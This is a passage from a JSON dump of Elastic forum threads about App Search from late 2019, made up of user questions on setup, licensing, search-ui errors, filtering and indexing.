    "body": "I have an Elastic cluster on bonsai.io, I want to use it to work with elastic app search locally on my computer. In app-search.yaml I added elasticsearch.host, elasticsearch.username and elasticsearch.password, but when I run bin / app-search I get an error: \"Elasticsearch cluster must be licensed. OSS versions of Elasticsearch do not contain a supported license. Please download and run an Elasticsearch binary from https://elastic.co/downloads/elasticsearch to acquire a free, Basic license.\" Has anyone encountered a similar error or knows how to fix it",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "187f7382-85ed-44bd-b166-8ff9e258e6ef",
    "url": "https://discuss.elastic.co/t/swiftype-app-search-not-showing-indexed-documents-using-python-api/209330",
    "title": "Swiftype App Search Not Showing Indexed Documents using Python API",
    "category": [
      "App Search"
    ],
    "author": "jh.94",
    "date": "November 25, 2019, 2:50pm November 25, 2019, 3:20pm December 23, 2019, 3:20pm",
    "body": "Hi There, I am currently refering to this tutorial on using python API to index document to the elastic app search engine. PyPI elastic-app-search An API client for Elastic App Search The code works fine but after going to the Swiftype App Search dashboard at localhost:3002 , it is not showing the index documents. image.png1085×671 41.5 KB Any suggestions as to why it is not updating? Thank you.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1fdd61e7-9791-4c27-a930-9fe82721b809",
    "url": "https://discuss.elastic.co/t/how-to-backup-and-restore-your-engines/207438",
    "title": "How to backup and restore your engines?",
    "category": [
      "App Search"
    ],
    "author": "tuyndv",
    "date": "November 12, 2019, 5:02am November 15, 2019, 12:10pm November 25, 2019, 3:19am December 23, 2019, 3:19am",
    "body": "Dear Team, I'm using App Search self-managed. So how to backup and restore your engines? Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4a3a27a7-5d4b-4c90-903b-562ecb08052f",
    "url": "https://discuss.elastic.co/t/how-to-process-the-nest-object-from-es-response-in-search-ui/208844",
    "title": "How to process the nest object (from ES response) in search-ui",
    "category": [
      "App Search"
    ],
    "author": "Nee_Defeng",
    "date": "November 21, 2019, 9:33am November 21, 2019, 12:36pm November 21, 2019, 7:52pm November 22, 2019, 2:09am November 22, 2019, 11:43am December 20, 2019, 11:43am",
    "body": "I now this is for App Search, but not sure where to post this search-ui for elasticsearch question. In a hard way that I learned that search-ui is expecting the 'id' field in the elasticsearch index hence the response. The problem is that the index is created by another program which does not have 'id', though it has the '_id' field. In the buildState.js file, I am able to convert '_id' to 'id', but for this reason, I have to use the 'record' instead of 'record._source'. With this, the result set returns the _source as this: \"_source\": [object Object] while 'id' is normal: \"id\": cee86628eaebffb36d3378be7a94651 So, how can I get the field inside the '_source' object? Here is the code from buildState.js: const res = hits.map(record => { return Object.entries(record) .map(([fieldName, fieldValue]) => [ fieldName == \"_id\" ? \"id\" : fieldName, toObject(fieldValue, getHighlight(record, fieldName)) ]) .reduce(addEachKeyValueToObject, {}); }); Here is the state returned by buildState.js, and you can see it is an object.: { \"id\": { \"raw\": \"8239827cd9e538e88a03f71d2c8ae14\" }, \"_index\": { \"raw\": \"myfirstfsjob\" }, \"_score\": { \"raw\": 9.116072 }, \"_source\": { \"raw\": { \"content\": \"XXX\", \"file\": { \"filename\": \"dt4_8.pdf\", \"url\": \"c:\\\\dt4_8.pdf\" } } } }",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "11889ff8-8351-4608-8419-53592fa56987",
    "url": "https://discuss.elastic.co/t/in-app-search-api-how-to-check-if-the-field-exists-or-not-in-a-document-during-search/208535",
    "title": "In App Search API how to check if the field exists or not in a document during search",
    "category": [
      "App Search"
    ],
    "author": "jayrraval",
    "date": "November 19, 2019, 3:10pm November 19, 2019, 9:18pm November 20, 2019, 3:59am November 20, 2019, 6:30pm November 21, 2019, 9:06am December 19, 2019, 9:11am",
    "body": "In App Search API, how i can in query for documents that does not contain a particular field. In elastic search we have \"exists\" keyword in while in App Search API there does not seems to be \"exists\" keyword to check if a field exists in a particular document.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c65828e4-8d45-4fc4-9955-c13d019283b9",
    "url": "https://discuss.elastic.co/t/typeerror-cannot-read-property-suggestion-of-null/208665",
    "title": "TypeError: Cannot read property 'suggestion' of null",
    "category": [
      "App Search"
    ],
    "author": "Swapnil_Ghorpade",
    "date": "November 20, 2019, 9:50am November 20, 2019, 3:53pm November 21, 2019, 7:30am December 19, 2019, 7:30am",
    "body": "Search ui is throwing error on pressing esc button. Steps to reproduce : Enter text for search and select search text from suggestions. 2.Press esc key to clear input it will throw 'Cannot read property 'suggestion' of null'",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d3bd690b-684f-436d-89ea-c31149f69762",
    "url": "https://discuss.elastic.co/t/swiftype-hosted-api-error-failed-to-fetch-9-39am-cors-issue/208473",
    "title": "Swiftype Hosted API - error Failed to fetch 9:39am (cors issue)",
    "category": [
      "App Search"
    ],
    "author": "Harry_Knowles",
    "date": "November 19, 2019, 9:41am November 19, 2019, 10:44am November 19, 2019, 10:59am November 19, 2019, 11:11am November 19, 2019, 11:16am November 19, 2019, 1:45pm December 17, 2019, 1:45pm",
    "body": "Hi, I'm having an issue with the API currently. Website: https://www.rydale.com/ We're recieving a CORS error: Access to fetch at 'https://host-64fz8w.api.swiftype.com/api/as/v1/engines/rydale/search.json' from origin 'https://www.rydale.com' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Credentials' header in the response is '' which must be 'true' when the request's credentials mode is 'include'. Does anyone know what is going on? Our entire search is currently offline during our black friday sale! Thanks, Harry.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d1da001e-edde-4967-882c-a68e0a54a425",
    "url": "https://discuss.elastic.co/t/security-how-to-avoid-exposing-app-search-keys-searchkey-host-identifier-enginename-in-search-ui/207993",
    "title": "Security - how to avoid exposing app search keys (searchKey,host identifier,engineName) in search ui",
    "category": [
      "App Search"
    ],
    "author": "Swapnil_Ghorpade",
    "date": "November 15, 2019, 6:03am November 15, 2019, 11:31am November 18, 2019, 7:10am November 18, 2019, 12:44pm November 18, 2019, 1:12pm November 18, 2019, 1:37pm November 18, 2019, 1:42pm November 19, 2019, 6:28am November 19, 2019, 12:23pm December 17, 2019, 12:23pm",
    "body": "I'm using app search with search ui https://github.com/elastic/search-ui Everything looks great about search ui except security. All keys Credentials (searchKey,host identifier,engineName) are visible in api call. I thought to move Connectors key logic to backend. So the flow will be like 1.search ui call backend api. 2 backend will call app search-api and return response as it is to show result on ui. is the right way to go? I haven’t found any way to give own api call from search-ui. How can I do this?",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "7489a189-333f-4dcd-9308-cf8a84c44f6d",
    "url": "https://discuss.elastic.co/t/relevance-tuning-settings-bad-request-on-save/207227",
    "title": "Relevance Tuning Settings Bad Request on SAVE",
    "category": [
      "App Search"
    ],
    "author": "Jonathan_Gautier",
    "date": "November 10, 2019, 2:14am November 15, 2019, 12:13pm November 15, 2019, 2:27pm November 15, 2019, 3:13pm December 13, 2019, 3:13pm",
    "body": "Hello, I got problem with AppSearch 7.4.2 ( Docker Version ). When i want to update Relevance Tuning Settings by click on SAVE button, i got 400 Bad Request. If somebody have an idea what is happening or Elastic Staff ? Thanks. URL Call: https://*****/as/engines/****/search_setting METHOD: PUT Content: {\"search_fields\":{\"description\":{\"weight\":1},\"title\":{\"weight\":1},\"picture\":{\"weight\":1},\"id\":{\"weight\":1}},\"result_fields\":{\"date\":{\"raw\":{}},\"price\":{\"raw\":{}},\"description\":{\"raw\":{}},\"id\":{\"raw\":{}},\"currency\":{\"raw\":{}},\"title\":{\"raw\":{}},\"picture\":{\"raw\":{}}},\"boosts\":{}}",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "16582b84-057f-4822-bb86-b7eed62a26d7",
    "url": "https://discuss.elastic.co/t/analytics-on-self-hosted-instance/205641",
    "title": "Analytics on self-hosted instance",
    "category": [
      "App Search"
    ],
    "author": "p_ban",
    "date": "October 29, 2019, 10:37am October 29, 2019, 10:43am October 29, 2019, 11:05am October 29, 2019, 11:19am October 29, 2019, 11:22am November 6, 2019, 1:35pm November 7, 2019, 1:06pm November 9, 2019, 6:59am November 12, 2019, 7:50am December 10, 2019, 7:50am",
    "body": "Hello, How can I start using Analytics with self-hosted App Search instance (the tab has no data, everything is 0)? I am performing search requests using php client with private-key. Do I need to add something to my requests?",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "f2edaa13-8d4b-4018-8995-930520183232",
    "url": "https://discuss.elastic.co/t/api-logs-view-request-details-very-slow/207427",
    "title": "[API Logs] View Request details very slow",
    "category": [
      "App Search"
    ],
    "author": "tuyndv",
    "date": "November 12, 2019, 1:42am December 10, 2019, 1:42am",
    "body": "Dear Team, Current i'm using App Search self-managed 7.4.2. I am having problems viewing logs details : View Request details very slow Please check for me thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3e8d0d36-bfbb-4e51-86c3-572ddd4f93f4",
    "url": "https://discuss.elastic.co/t/credential-search-limiting/206971",
    "title": "Credential Search Limiting",
    "category": [
      "App Search"
    ],
    "author": "Jonathan_Gautier",
    "date": "November 7, 2019, 2:23pm November 7, 2019, 3:32pm November 7, 2019, 3:32pm December 5, 2019, 3:32pm",
    "body": "Hello, I want to know if is possible to create now or in the future credential for searching, where we can limit value user can search and retrieve. Example, I got a Document with this schema: { title: string, description: string, country: string } I want user can just search title and description and retrieve it. And another user with another credential search can search and retrieve all values. Tell me if this can be possible. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fca0ee8d-bff6-4fa1-b61d-38c2e5962d21",
    "url": "https://discuss.elastic.co/t/app-search-trying-to-authenticate-using-admin-cookie-even-though-a-search-token-is-provided/206755",
    "title": "App search trying to authenticate using admin cookie even though a search token is provided",
    "category": [
      "App Search"
    ],
    "author": "Max_Akn",
    "date": "November 6, 2019, 9:03am November 6, 2019, 12:12pm November 6, 2019, 1:16pm November 6, 2019, 1:21pm December 4, 2019, 1:21pm",
    "body": "When accessing both the admin and the application using app search within the same browser, app search always tries to authenticate a request via the admin cookie, even when the search token is provided. So when the cookie is expired, you see an http auth dialog popping when doing a search. This issue was already discussed here Failed authentication after period of time",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8847b75b-9aab-47b5-a1cd-785daaebc4e0",
    "url": "https://discuss.elastic.co/t/auto-refetch-refresh-result-on-clearing-search-box-text/206233",
    "title": "Auto Refetch/refresh result on clearing search box text",
    "category": [
      "App Search"
    ],
    "author": "Swapnil_Ghorpade",
    "date": "November 2, 2019, 10:02am November 4, 2019, 7:09pm November 5, 2019, 6:30am November 5, 2019, 1:56pm November 6, 2019, 11:02am December 4, 2019, 11:02am",
    "body": "Result is not get automatically refresh or fetched on clearing entered text from search box ? Its showing old result. Need to hit search button or enter.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "5ffeebcc-0ace-487f-ba8c-8ab83fa73a37",
    "url": "https://discuss.elastic.co/t/bug-app-search-dashboard-fails-to-load-after-restarting-the-server/206237",
    "title": "[Bug?] App Search Dashboard Fails To Load After Restarting The Server",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "November 2, 2019, 1:26pm November 2, 2019, 5:10pm November 5, 2019, 6:23pm December 3, 2019, 6:24pm",
    "body": "I'm trying to install app search on ubuntu 18.04 and was able to successfully setup. Here's an overview of my setup: Installed Elasticsearch and App Search 7.4.2 via apt Added xpack.security.enabled: true to elasticsearch.yml Generated automatic passwords by running bin/elasticsearch-setup-passwords auto and noted down the passwords. Added the following to app-search.yml: allow_es_settings_modification: true app_search.auth.source: standard elasticsearch.username: elastic elasticsearch.password: <password generated in step #3> Ran app-search by running bin/app-search I then noted down the username and default password generated username: app-search@example.com password: hnrxxam9khgtq38u I was able to login to the app-search console. I however then stopped the app-search by pressing CTRL+C and tried to restart with by running bin/app-search. The server did start; but now I could not get to the dashboard again. The console output was as follows, while the chrome got into endless waiting for page state - **app-server.1 |** [2019-11-02T13:20:08.019+00:00][6800][2268][app-server][INFO]: [c1d9ba72-f40e-4925-b5f0-56c1e9744054] Started GET \"/\" for 49.36.27.83 at 2019-11-02 13:20:08 +0000 **app-server.1 |** [2019-11-02T13:20:08.044+00:00][6800][2268][action_controller][INFO]: [c1d9ba72-f40e-4925-b5f0-56c1e9744054] Processing by LocoTogo::HomeController#index as HTML **app-server.1 |** [2019-11-02T13:20:08.047+00:00][6800][2268][action_controller][INFO]: [c1d9ba72-f40e-4925-b5f0-56c1e9744054] Parameters: {\"host\"=>\"139.59.11.80:3002\", \"protocol\"=>\"http\"} **app-server.1 |** [2019-11-02T13:20:08.164+00:00][6800][2268][action_controller][INFO]: [c1d9ba72-f40e-4925-b5f0-56c1e9744054] Redirected to http://139.59.11.80:3002/login **app-server.1 |** [2019-11-02T13:20:08.180+00:00][6800][2268][action_controller][INFO]: [c1d9ba72-f40e-4925-b5f0-56c1e9744054] Completed 302 Found in 130ms **app-server.1 |** [2019-11-02T13:20:08.234+00:00][6800][2250][app-server][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Started GET \"/login\" for 49.36.27.83 at 2019-11-02 13:20:08 +0000 **app-server.1 |** [2019-11-02T13:20:08.245+00:00][6800][2250][action_controller][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Processing by LocoTogo::SessionsController#login as HTML **app-server.1 |** [2019-11-02T13:20:08.248+00:00][6800][2250][action_controller][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Parameters: {\"host\"=>\"139.59.11.80:3002\", \"protocol\"=>\"http\"} **app-server.1 |** [2019-11-02T13:20:08.295+00:00][6800][2250][action_view][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Rendered eui_icons/_close.html (0.4ms) **app-server.1 |** [2019-11-02T13:20:08.306+00:00][6800][2250][action_view][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Rendered eui_icons/_lock.html (0.9ms) **app-server.1 |** [2019-11-02T13:20:08.317+00:00][6800][2250][action_view][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Rendered loco_togo/app/views/loco_togo/sessions/login.html.rb (47.4ms) **app-server.1 |** [2019-11-02T13:20:08.320+00:00][6800][2250][action_controller][INFO]: [eb2e7e67-bfa5-4349-aaad-1add172b44ac] Completed 200 OK in 71ms (Views: 52.2ms) I can confirm that I've repeatedly reproduced this issue. Can someone from Elastic team confirm that this is an issue? Or is there something wrong with my configuration?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "10450666-52f0-4121-8556-5232e81658b0",
    "url": "https://discuss.elastic.co/t/please-support-app-search-api-client-c/203946",
    "title": "Please support App Search Api Client (C#)",
    "category": [
      "App Search"
    ],
    "author": "tuyndv",
    "date": "October 17, 2019, 12:21am October 22, 2019, 7:22pm November 3, 2019, 12:43pm December 1, 2019, 12:43pm",
    "body": "Dear Team, Please support App Search Api Client for C# (dotnet FW or .Net Core). Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "bf9fcbe4-ee6f-4cdc-89e8-8a1b83ba631e",
    "url": "https://discuss.elastic.co/t/please-support-result-settings-for-appsearch-self-managed/206239",
    "title": "Please support Result Settings for AppSearch self-managed",
    "category": [
      "App Search"
    ],
    "author": "tuyndv",
    "date": "November 2, 2019, 2:57pm November 30, 2019, 2:41pm",
    "body": "Dear Team, Current, i'm using AppSearch self-managed version 7.4.2. I don't see the Search Settings=>Result Settings feature of this version. 2019-11-02_21-50-32.jpg3840×1806 552 KB 2019-11-02_21-54-58.jpg3840×1806 339 KB Please support Result Settings for next version. Thanks Team",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fd6b3203-0a2d-4a43-a86a-3b706cb7b42f",
    "url": "https://discuss.elastic.co/t/set-appsearch-to-use-an-existing-index/205924",
    "title": "Set AppSearch to use an existing index",
    "category": [
      "App Search"
    ],
    "author": "Brian_B",
    "date": "October 31, 2019, 12:54pm November 1, 2019, 10:05am November 2, 2019, 1:16pm November 2, 2019, 1:16pm",
    "body": "We have an existing ES index and now want to self-host AppSearch to manage it, but I can't find a way to tell AppSearch to use our existing index. It just creates a new index using a random Guid in the name and forces us to work with that index. According to another post here, someone suggested this isn't possible. So AppSearch requires that you dump your existing index and create a new one from scratch?? How does that make any sense? I can't believe that is the reality. It makes self-hosted AppSearch more of a learning tool than something you could actually use in production. Here is the other post: Elastic App Search using Elastic Search Index App Search Hi Is there any way possible to map my current elastic search documents to App search instead of writing to App search documents ? Details: We have existing elastic search index with lots of documents in it. I would like to use this index to build Elastic App Search. Please advise. Thanks in Advance Srini.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f971590e-8175-4163-851a-9feb3517618f",
    "url": "https://discuss.elastic.co/t/where-exactly-is-the-app-search-password-is-printed/206200",
    "title": "Where exactly is the app-search password is printed?",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "November 1, 2019, 5:58pm November 2, 2019, 10:52am November 30, 2019, 10:52am",
    "body": "The documentation says that it's printed in the console. Is it the \"console\" in Chrome's inspector or some other place? Can someone help me locate it, please?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a8152378-834b-43cb-8b24-a48f1e48d8be",
    "url": "https://discuss.elastic.co/t/how-to-exclude-facets-in-filters-or-get-conditional-filters-conditionalfacets/206044",
    "title": "How to exclude facets in filters or get conditional filters/conditionalFacets",
    "category": [
      "App Search"
    ],
    "author": "Swapnil_Ghorpade",
    "date": "October 31, 2019, 1:37pm October 31, 2019, 5:05pm November 1, 2019, 6:01am November 1, 2019, 10:35am November 1, 2019, 11:14am November 1, 2019, 11:30am November 1, 2019, 11:49am November 1, 2019, 12:15pm November 1, 2019, 12:43pm November 1, 2019, 1:30pm November 1, 2019, 1:36pm November 2, 2019, 9:41am November 30, 2019, 9:41am",
    "body": "App structure Engine : national-parks-example schema: [title, id, state, description]. Facet shows filters based on state field values. I have following scenario There are different users who can access documents from engine. User's will be able to access documents excluding some states (excluding restricted states for each type of users) . Show respected state facet/filters to users Example : Consider there are 2 users User-1 : restricted states ['California'] User-2 : restricted states ['Texas', 'Florida'] * If User-1 logged in he can see all states documents except 'California' * Facets will show all states in filters except 'California' * For User-2 : show documents excluding state 'Texas' and 'Florida' * Facets will show all states in filters except 'Texas', 'Florida'",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "8d25ac0d-080e-47b9-99b4-aa1a3059f1c4",
    "url": "https://discuss.elastic.co/t/did-i-configure-app-search-yml-right/206138",
    "title": "Did I configure app-search.yml right?",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "November 1, 2019, 12:00pm November 29, 2019, 9:56am",
    "body": "I've successfully installed app-search (self-managed) on Ubuntu 18.04. I'm however not sure if I've configured it right. Here are the entries I've modified in my app-search.yml file: - allow_es_settings_modification: true app_search.external_url: http://<MY-SERVER-IP>:3002 app_search.listen_host: <MY-SERVER-IP> I can now access app-search from the http://<MY-SERVER-IP>:3002 and it seems to be working as expected. I'm however wondering if above settings are correct. Should the app_search.listen_host` be set to 127.0.0.1 OR my server IP? Is there any other setting I should pay attention to when going live with production server? Thank you in advance. Addendum: Upon restarting the app-search server; I'm unable to load pages. App Search throws - Completed 401 Unauthorized in 68ms I'm running with default settings and have not set any credentials to access app-search. What exactly is going wrong?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3ba18da5-cc1b-45f1-9533-3aaf448a3ecc",
    "url": "https://discuss.elastic.co/t/how-to-display-json-keys-in-search-ui-query-response/205772",
    "title": "How to display json keys in Search UI query response",
    "category": [
      "App Search"
    ],
    "author": "cerro",
    "date": "October 30, 2019, 12:33pm October 31, 2019, 5:17pm November 1, 2019, 11:14am November 29, 2019, 11:17am",
    "body": "I have json docs that contain one field \"content\" (and ID) with many nested json key:value objects. In addition, there can be many of the same keys int the document. An example would look something like this: { \"content\": [ {\"url\": \"https://www.xxx.com\" {\"title\": \"doc title\"}, {\"person\": \"person1\"}, {\"city\": \"city1\" {\"person\": \"person2\"}, {\"person\": \"person3\"} ]} I can index and search the documents. However, I want to display the URL, Title, etc., as the query response. I see how to do this if they are fields in a simpler structure, but unclear how to display these based on the example. Currently, I get the \"content\" with the key:value pair based on the search term. i.e. \"content\": {\"title\":\"doc title\"} \"id\": \"doc-12233444\" or \"content\": {\"url\":\"https://www.xxx.com\"} \"id\": \"doc-12233444\" This is how the field in the above example is used in Kibana: {\"field\": \"content.title.keyword\"} I'm a nube at Elastic App Search. Any help would be greatly appreciated. Thanks in advance!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "14092827-623e-4053-a473-162ca3efa873",
    "url": "https://discuss.elastic.co/t/building-a-website-search-engine-with-appsearch/205962",
    "title": "Building a website search engine with Appsearch",
    "category": [
      "App Search"
    ],
    "author": "bpamiri",
    "date": "October 31, 2019, 12:22am October 31, 2019, 5:21pm November 28, 2019, 5:21pm",
    "body": "Any thought of open sourcing the crawler from site search. I’d like to create a website search engine for a vertical market and see being able to use app search for the indexing and searching but need a solution for the crawling.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8260a8b0-9f3e-4a53-8fe7-512d951a192e",
    "url": "https://discuss.elastic.co/t/open-source-versus-basic-plan/205949",
    "title": "Open Source versus Basic Plan?",
    "category": [
      "App Search"
    ],
    "author": "Brian_B",
    "date": "October 30, 2019, 9:19pm October 30, 2019, 9:45pm October 30, 2019, 9:56pm October 30, 2019, 11:41pm November 27, 2019, 11:28pm",
    "body": "According to the subscriptions page, there are two different free downloads: Open Source and Basic. The Basic version appears to have more features. But when I click on the links for the two options they both redirect you to the same download page, thus making it seem that they are actually identical. Are there two different downloads are are they both the same product? Here is the page: https://www.elastic.co/subscriptions",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8891699e-5145-40c9-821a-03bad09f3cdb",
    "url": "https://discuss.elastic.co/t/specify-the-index-for-app-search-to-use/205927",
    "title": "Specify the index for App Search to use",
    "category": [
      "App Search"
    ],
    "author": "Brian_B",
    "date": "October 30, 2019, 6:02pm October 30, 2019, 9:52pm November 27, 2019, 9:45pm",
    "body": "We have an existing ES index and now want to self-host AppSearch to manage it, but I can't find a way to tell AppSearch to use our existing index. It just creates a new index using a random Guid in the name and forces us to work with that index. According to another post here, someone suggested this isn't possible. So AppSearch requires that you dump your existing index and create a new one from scratch?? How does that make any sense? I can't believe that is the reality. It makes self-hosted AppSearch more of a learning tool than something you could actually use in production. Here is the other post: Elastic App Search using Elastic Search Index App Search Hi Is there any way possible to map my current elastic search documents to App search instead of writing to App search documents ? Details: We have existing elastic search index with lots of documents in it. I would like to use this index to build Elastic App Search. Please advise. Thanks in Advance Srini.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "536071b3-c230-4a6a-803d-46a302244fdd",
    "url": "https://discuss.elastic.co/t/search-for-2-key-words-in-a-single-query/205679",
    "title": "Search for 2 key words in a single query",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 29, 2019, 1:58pm October 30, 2019, 3:58pm November 27, 2019, 3:58pm",
    "body": "Is there any way to search for 2 key words in a single query. Eg: [ { id:1 name:Jim, description:cool guy, employer:Delta Dental, address: Okemos }, { id:2, name:Jim, description: grumpy guy, employer: FedEx, address:Memphis }, { id:3, name:Jim, description: funny guy, employer: Delta Dental, address: Okemos }, id:4, name:Jim, description: funny guy, employer: Delta Dental, address: Minnesota } ] I wanna search for user Jim, who is a cool guy, who works for DeltaDental and lives in Okemos?? I am thinking the query should be Query:\"Jim\" \"filters\": { \"all\": [ { description:\"cool guy\" }, { employer: Delta Dental }, { address: Okemos } ] } Is the above query correct?? or is there any other efficient way ? sometimes the query could be search for user who is a cool guy, who works for DeltaDental and lives in Okemos?? In this case there is not user name specified. so what do I do now? Is there a way for the below query?? Query:\"Jim\",\"cool guy\" \"filters\": { \"all\": [ { employer: Delta Dental }, { address: Okemos } ] }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a522b939-04dc-423d-85c3-bec2c65aa318",
    "url": "https://discuss.elastic.co/t/wildcard-in-query-for-app-search/205697",
    "title": "Wildcard in query for app-search?",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 29, 2019, 2:59pm October 30, 2019, 3:53pm November 27, 2019, 11:42am",
    "body": "Is there a way to put wildcard in query field of app-search?? Like \"query\": \"[%]\"",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5130a847-8367-4412-86d5-3fb841c9952c",
    "url": "https://discuss.elastic.co/t/how-to-implement-proximity-search-in-app-search/203966",
    "title": "How to implement proximity search in app search",
    "category": [
      "App Search"
    ],
    "author": "ranjeet.tiwari",
    "date": "October 17, 2019, 4:31am October 22, 2019, 6:52am October 22, 2019, 11:36am October 22, 2019, 11:40am October 28, 2019, 8:41am October 28, 2019, 10:28am October 28, 2019, 10:30am October 28, 2019, 10:32am October 28, 2019, 10:36am October 28, 2019, 10:39am October 28, 2019, 11:12am November 25, 2019, 11:12am",
    "body": "How to implement proximity search in app search?",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "2b063ec9-1652-43ad-935b-0da09e57b12c",
    "url": "https://discuss.elastic.co/t/bulkindexing/205325",
    "title": "BulkIndexing",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 25, 2019, 8:36pm October 25, 2019, 8:41pm November 22, 2019, 8:42pm",
    "body": "Is there a way for bulk indexing in app-search similar to Elastic search??",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c32253d4-c8f5-4f66-80f1-22e9c316012e",
    "url": "https://discuss.elastic.co/t/good-visualisation-tools-to-manage-searches-in-website/204430",
    "title": "Good visualisation tools to manage searches in website",
    "category": [
      "App Search"
    ],
    "author": "jamartins",
    "date": "October 22, 2019, 10:39pm October 22, 2019, 10:38pm October 25, 2019, 11:49am November 22, 2019, 11:50am",
    "body": "Hi all! I've been looking for made tools, or ideas to develop our own, to help me visualize the searches our clients do in our website, their evolution over time and their rate of success (for example, successive queries with high similarity are probably not a good sign), but haven't found anything that works at that business intelligence level, only visualisations for infrastructural information like health of the nodes and such. I'd really appreciate any help or suggestions on interfaces that can help us in managing the distribution and discovery of our products through our search bar. I've checked Kibana, dejavu, elasticHQ, but they all seem to be made with the technical maintainer of the infrastructure in mind, and not to verify how well are people using the search bar. Thank you!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "671d418a-3f27-4a9b-9055-3c363fc7cd8c",
    "url": "https://discuss.elastic.co/t/synonym-set-limit/204050",
    "title": "Synonym Set Limit?",
    "category": [
      "App Search"
    ],
    "author": "jgrams",
    "date": "October 17, 2019, 12:22pm October 22, 2019, 7:47pm October 22, 2019, 7:48pm October 23, 2019, 11:31am November 20, 2019, 11:31am",
    "body": "Hello, I work for an e-commerce company, and we are looking to migrate our product search to App Search. In our current product search application, we have over 700 synonym sets. I began copying these synonym sets to App Search, but once I reached 256 sets, I could not add another one. Trying to add another set results in the message: Engine has the maximum number of synonyms, no more can be added Is there any way to get past this? A configurable setting or some other workaround? Thank you for your help",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "00e1f8ad-7cfd-4556-bc2f-8498824c3afe",
    "url": "https://discuss.elastic.co/t/dictionary-vs-map-datastructure-in-app-search/204141",
    "title": "Dictionary vs Map datastructure in app-search?",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 17, 2019, 11:30pm October 22, 2019, 7:43pm November 19, 2019, 7:43pm",
    "body": "{ \"address_id\":1 \"residential_address\": { \"current\": \"USA\", \"previous\": \"India\" }, \"office_address\": { \"current\": \"Okemos\", \"previous\": \"Bangalore\" }, \"id\": 1 } In the above mentioned data structure I have Map of address which internally holds map of current and previous address. What is the efficient way to index this data structure in app-search?? can I use dictionary to efficiently save the structure(if so can anyone tell me how)?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a27dcb83-8c08-47a0-8252-e297a7b28f1d",
    "url": "https://discuss.elastic.co/t/how-to-get-the-intersection-of-the-search-results-of-a-multi-search-in-app-search/204154",
    "title": "How to get the intersection of the search results of a multi-search in App-search?",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 18, 2019, 2:29am October 22, 2019, 11:44am November 19, 2019, 11:57am",
    "body": "Query: \"queries\": [ { \"search_fields\": { \"fruit_name\": {} }, \"query\": \"apples\" }, { \"search_fields\": { \"type\": {} }, \"query\": \"gala\" } ] Result: [ { \"results\": [ { \"fruit_id\": { \"raw\": \"9\" }, \"fruit_name\": { \"raw\": \"apple\" }, \"type\": { \"raw\": \"gala\" } \"id\": { \"raw\": \"9\" } }, { \"fruit_id\": { \"raw\": \"1\" }, \"fruit_name\": { \"raw\": \"apple\" }, \"type\": { \"raw\": \"red\" } \"id\": { \"raw\": \"1\" } } ] }, { \"results\": [ { \"fruit_id\": { \"raw\": \"9\" }, \"fruit_name\": { \"raw\": \"apple\" }, \"type\": { \"raw\": \"gala\" } \"id\": { \"raw\": \"9\" } }, { \"fruit_id\": { \"raw\": \"10\" }, \"festival_name\": { \"raw\": \"festival\" }, \"type\": { \"raw\": \"gala\" } \"id\": { \"raw\": \"10\" } } ] } ] Is there any way to get the common result from both the result sets??",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f41c9143-2cd6-472c-b5b6-aa7a3a1b19a5",
    "url": "https://discuss.elastic.co/t/cant-connect-to-aws-elasticsearch-cluster/204296",
    "title": "Can't connect to aws elasticsearch cluster",
    "category": [
      "App Search"
    ],
    "author": "Ardy_Febriansyah",
    "date": "October 19, 2019, 1:51pm October 21, 2019, 8:37am October 21, 2019, 1:36pm October 21, 2019, 2:55pm November 18, 2019, 2:57pm",
